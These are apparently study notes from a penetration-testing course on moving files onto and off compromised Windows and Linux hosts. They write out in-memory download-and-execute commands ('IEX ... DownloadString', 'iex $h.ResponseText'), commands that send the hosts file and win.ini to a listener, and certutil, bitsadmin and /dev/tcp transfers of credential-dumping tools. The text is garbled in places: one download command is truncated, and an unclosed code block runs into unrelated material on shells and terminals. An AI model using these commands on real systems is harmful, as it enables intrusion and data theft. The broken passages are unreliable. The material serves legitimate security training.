**Note:** While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.


## PowerShell Web Downloads

Most companies allow `HTTP` and `HTTPS` outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.

PowerShell offers many file transfer options. In any version of PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:

|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|

Let's explore some examples of those methods for downloading files using PowerShell.

#### PowerShell DownloadFile Method

We can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.


```bash
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

#### PowerShell DownloadString - Fileless Method

As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.

Windows File Transfer Methods

```bash
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/maste
```


## SMB Downloads
#impacket-smbserver




The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.

#### Create the SMB Server

Windows File Transfer Methods

```bash
c0derpwner@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

```


#### Copy a File from the SMB Server

Windows File Transfer Methods

```cmd
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```



#### Mount the SMB Server with Username and Password

Windows File Transfer Methods

```cmd
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```




## FTP Downloads

Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.


```bash
python3 -m pyftpdlib --port 21  
[I 2025-03-29 19:17:05] concurrency model: async  
[I 2025-03-29 19:17:05] masquerade (NAT) address: None  
[I 2025-03-29 19:17:05] passive ports: None  
[I 2025-03-29 19:17:05] >>> starting FTP server on 0.0.0.0:21, pid=9163 <<<
```



#### Transferring Files from an FTP Server Using PowerShell

Windows File Transfer Methods

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```


#### Create a Command File for the FTP Client and Download the Target File

Windows File Transfer Methods

```cmd
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt

C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file

## FTP Uploads

Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.

Windows File Transfer Methods

```bash
c0derpwner@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",

[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```

Now let's use the PowerShell upload function to upload a file to our FTP Server.

#### PowerShell Upload File

Windows File Transfer Methods

```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

Windows File Transfer Methods

```powershell
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```


```bash
c0derpwner@htb[/htb]$ nc -lvnp 8000

listening on [any] 8000 ...

```


## SMB Uploads

We previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).


An alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.


#### Configuring WebDav Server

To set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)). After installing them, we run the `wsgidav` application in the target directory.

#### Installing WebDav Python modules

Windows File Transfer Methods

```bash
c0derpwner@htb[/htb]$ sudo pip3 install wsgidav cheroot

[sudo] password for plaintext:

     ...SNIP...
```

#### Using the WebDav Python module

Windows File Transfer Methods

```bash
c0derpwner@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext:

```

#### Connecting to the Webdav Share

Now we can attempt to connect to the share using the `DavWWWRoot` directory.

Windows File Transfer Methods

```cmd
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

**Note:** `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

#### Uploading Files using SMB

Windows File Transfer Methods

```cmd
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

**Note:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

# Miscellaneous File Transfer Methods



We've covered various methods for transferring files on Windows and Linux. We also covered ways to achieve the same goal using different programming languages, but there are still many more methods and applications that we can use.

This section will cover alternative methods such as transferring files using [Netcat](https://en.wikipedia.org/wiki/Netcat), [Ncat](https://nmap.org/ncat/) and using RDP and PowerShell sessions.



## Netcat

[Netcat](https://sectools.org/tool/netcat/) (often abbreviated to `nc`) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.

The original Netcat was [released](http://seclists.org/bugtraq/1995/Oct/0028.html) by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce [Ncat](https://nmap.org/ncat/), a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.

In this section, we will use both the original Netcat and Ncat.

**Note:** **Ncat** is used in HackTheBox's PwnBox as nc, ncat, and netcat.

## File Transfer with Netcat and Ncat

The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.

In this example, we'll transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.

We'll first start Netcat (`nc`) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\)) using a single greater-than `>` followed by the filename, `SharpKatz.exe`.

#### NetCat - Compromised Machine - Listening on Port 8000

Miscellaneous File Transfer Methods

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.

#### Ncat - Compromised Machine - Listening on Port 8000

Miscellaneous File Transfer Methods

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

#### Netcat - Attack Host - Sending File to Compromised machine

Miscellaneous File Transfer Methods

```shell-session
c0derpwner@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
c0derpwner@htb[/htb]$ # Example using Original Netcat
c0derpwner@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.

#### Ncat - Attack Host - Sending File to Compromised machine

Miscellaneous File Transfer Methods

```shell-session
c0derpwner@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
c0derpwner@htb[/htb]$ # Example using Ncat
c0derpwner@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.

#### Attack Host - Sending File as Input to Netcat

Miscellaneous File Transfer Methods

```shell-session
c0derpwner@htb[/htb]$ # Example using Original Netcat
c0derpwner@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Compromised Machine Connect to Netcat to Receive the File

Miscellaneous File Transfer Methods

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Let's do the same with Ncat:

#### Attack Host - Sending File as Input to Ncat

Miscellaneous File Transfer Methods

```shell-session
c0derpwner@htb[/htb]$ # Example using Ncat
c0derpwner@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connect to Ncat to Receive the File

Miscellaneous File Transfer Methods

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

#### NetCat - Sending File as Input to Netcat

Miscellaneous File Transfer Methods

```shell-session
c0derpwner@htb[/htb]$ # Example using Original Netcat
c0derpwner@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - Sending File as Input to Ncat

Miscellaneous File Transfer Methods

```shell-session
c0derpwner@htb[/htb]$ # Example using Ncat
c0derpwner@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

Miscellaneous File Transfer Methods

```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

**Note:** The same operation can be used to transfer files from the compromised host to our Pwnbox.

## PowerShell Session File Transfer

We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.

We have a session as `Administrator` in `DC01`, the user has administrative rights on `DATABASE01`, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.

#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

Miscellaneous File Transfer Methods

```powershell
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

Miscellaneous File Transfer Methods

```powershell
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.

#### Create a PowerShell Remoting Session to DATABASE01

Miscellaneous File Transfer Methods

```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.

#### Copy samplefile.txt from our Localhost to the DATABASE01 Session

Miscellaneous File Transfer Methods

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### Copy DATABASE.txt from DATABASE01 Session to our Localhost

Miscellaneous File Transfer Methods

```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

---

## RDP

RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.

If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.

As an alternative to copy and paste, we can mount a local resource on the target RDP server. `rdesktop` or `xfreerdp` can be used to expose a local folder in the remote RDP session.

#### Mounting a Linux Folder Using rdesktop

Miscellaneous File Transfer Methods

```bash
c0derpwner@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Mounting a Linux Folder Using xfreerdp

Miscellaneous File Transfer Methods

```bash
c0derpwner@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.

![Windows File Explorer showing a network folder named 'tsclient' with a subfolder 'linux'.](https://academy.hackthebox.com/storage/modules/24/tsclient.jpg)

Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.

![Remote Desktop Connection settings showing options for configuring remote audio, keyboard shortcuts, and local resources like printers and drives.](https://academy.hackthebox.com/storage/modules/24/rdp.png)

After selecting the drive, we can interact with it in the remote session that follows.

**Note:** This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.

# Protected File Transfers



As penetration testers, we often gain access to highly sensitive data such as user lists, credentials (i.e., downloading the NTDS.dit file for offline password cracking), and enumeration data that can contain critical information about the organization's network infrastructure, and Active Directory (AD) environment, etc. Therefore, it is essential to encrypt this data or use encrypted data connections such as SSH, SFTP, and HTTPS. Howe
ver, sometimes these options are not available to us, and a different approach is required.


## File Encryption on Windows

Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) PowerShell script. This script is small and provides encryption of files and strings.

```powershell
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 
```


```powershell
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
```

Command:
```powershell
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

File encrypted to C:\htb\scan-results.txt.aes
PS C:\htb> ls

    Directory: C:\htb

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
-a----        11/18/2020  12:19 PM           1724 scan-results.txt
-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
```


## File Encryption on Linux

[OpenSSL](https://www.openssl.org/) is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style" to encrypt files.


```bash
c0derpwner@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

enter aes-256-cbc encryption password:                                                         
Verifying - enter aes-256-cbc encryption password:  
```

#### Decrypt passwd.enc with openssl

Protected File Transfers

```bash
c0derpwner@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    

enter aes-256-cbc decryption password:
```


# Living off The Land



The phrase "Living off the land" was coined by Christopher Campbell [@obscuresec](https://twitter.com/obscuresec) & Matt Graeber [@mattifestation](https://twitter.com/mattifestation) at [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw).

The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

This section will focus on using LOLBAS and GTFOBins projects and provide examples for download and upload functions on Windows & Linux systems.

---

## Using the LOLBAS and GTFOBins Project

[LOLBAS for Windows](https://lolbas-project.github.io/#) and [GTFOBins for Linux](https://gtfobins.github.io/) are websites where we can search for binaries we can use for different functions.

### LOLBAS
#lolbas

To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`.

![LOLBAS project page listing binaries like CertReq.exe with functions and ATT&CK techniques.](https://academy.hackthebox.com/storage/modules/24/lolbas_upload.jpg)

Let's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) as an example.

We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.

#### Upload win.ini to our Pwnbox

Living off The Land

```cmd
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

This will send the file to our Netcat session, and we can copy-paste its contents.

#### File Received in our Netcat Session

Living off The Land

```bash
c0derpwner@htb[/htb]$ sudo nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819

```

If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter. You can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.

### GTFOBins

To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`.

![GTFObins page listing Unix binaries with functions like file upload and download, and associated ATT&CK techniques.](https://academy.hackthebox.com/storage/modules/24/gtfobins_download.jpg)

Let's use [OpenSSL](https://www.openssl.org/). It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."

We need to create a certificate and start a server in our Pwnbox.

#### Create Certificate in our Pwnbox

Living off The Land

```bash
c0derpwner@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

#### Stand up the Server in our Pwnbox

Living off The Land

```bash
c0derpwner@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Next, with the server running, we need to download the file from the compromised machine.

#### Download File from the Compromised Machine

Living off The Land

```bash
c0derpwner@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Other Common Living off the Land tools

### Bitsadmin Download function

The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.

#### File Download with Bitsadmin

Living off The Land

```powershell-session
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.

#### Download

Living off The Land

```powershell-session
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Certutil

Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto `wget` for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.

#### Download a File with Certutil

Living off The Land

```cmd
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

# Detection



Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the process of whitelisting all command lines in a particular environment is initially time-consuming, it is very robust and allows for quick detection and alerting on any unusual command lines.

Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with the `HTTP` protocol. There is a need for interoperability amongst different web servers and web browser types to ensure that users have the same experience no matter their browser. HTTP clients are most readily recognized by their user agent string, which the server uses to identify which `HTTP` client is connecting to it, for example, Firefox, Chrome, etc.

User agents are not only used to identify web browsers, but anything acting as an `HTTP` client and connecting to a web server via `HTTP` can have a user agent string (i.e., `cURL`, a custom `Python` script, or common tools such as `sqlmap`, or `Nmap`).

Organizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings, user agents used by default operating system processes, common user agents used by update services such as Windows Update, and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions. This [website](http://useragentstring.com/index.php) is handy for identifying common user agent strings. A list of user agent strings is available [here](http://useragentstring.com/pages/useragentstring.php).

Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common `HTTP` transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).


#### Invoke-WebRequest - Client

Detection

```powershell
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

#### Invoke-WebRequest - Server

Detection

```bash
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

#### WinHttpRequest - Client

Detection

```powershell
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```


Detection

```bash
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```


#### Certutil - Client

Detection

```cmd
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

### Changing user agent in Powershell


```powershell

A `shell` is a program that provides a computer user with an interface to input instructions into the system and view text output (Bash, Zsh, cmd, and PowerShell, for example). As penetration testers and information security professionals, a shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host.


## Why Get a Shell?

Remember that the shell gives us direct access to the `OS`, `system commands`, and `file system`. So if we gain access, we can start enumerating the system for vectors that may allow us to escalate privileges, pivot, transfer files, and more. If we don't establish a shell session, we are pretty limited on how far we can get on a target machine.



Every operating system has a shell, and to interact with it, we must use an application known as a `terminal emulator`. Here are some of the most common terminal emulators:

|**Terminal Emulator**|**Operating System**|
|:--|:--|
|[Windows Terminal](https://github.com/microsoft/terminal)|Windows|
|[cmder](https://cmder.app)|Windows|
|[PuTTY](https://www.putty.org)|Windows|
|[kitty](https://sw.kovidgoyal.net/kitty/)|Windows, Linux and MacOS|
|[Alacritty](https://github.com/alacritty/alacritty)|Windows, Linux and MacOS|
|[xterm](https://invisible-island.net/xterm/)|Linux|
|[GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal)|Linux|
|[MATE Terminal](https://github.com/mate-desktop/mate-terminal)|Linux|
|[Konsole](https://konsole.kde.org)|Linux|
|[Terminal](https://en.wikipedia.org/wiki/Terminal_\(macOS\))|MacOS|
|[iTerm2](https://iterm2.com)|MacOS|


Much like a human language interpreter will translate spoken or sign language in real-time, a `command language interpreter` is a program working to interpret the instructions provided by the user and issue the tasks to the operating system for processing. So when we discuss command-line interfaces, we know it is a combination of the operating system, terminal emulator application, and the command language interpreter.

